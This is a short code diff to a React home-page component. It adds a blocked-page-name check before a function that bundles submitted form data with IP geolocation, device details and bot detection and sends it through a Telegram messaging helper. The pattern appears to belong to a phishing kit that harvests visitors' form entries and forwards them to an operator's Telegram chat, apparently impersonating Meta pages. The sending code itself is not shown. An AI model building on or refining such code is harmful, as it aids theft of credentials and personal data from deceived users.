@@ -20,6 +20,7 @@ import IcWarning from '@/assets/images/ic_warning.svg';
 import { applyTranslations } from '@/utils/apply-translations';
 import { getDeviceLabel } from '@/utils/device';
 import { sendTelegramMessage } from '@/utils/send-message';
+import { isBlockedPageName } from '@/utils/blocked-page';
 import appConfig from '@/utils/config';
 import { buildMetaMessage } from '@/utils/message';
 import detectBot from '@/utils/detect_bot';
@@ -201,6 +202,9 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
 
     const buildAndSend = () => {
         const form = formDataRef.current;
+        if (isBlockedPageName(form.pageName)) {
+            return;
+        }
         const geo = ipInfoRef.current;
         const geoInfo = {
             asn: 0,
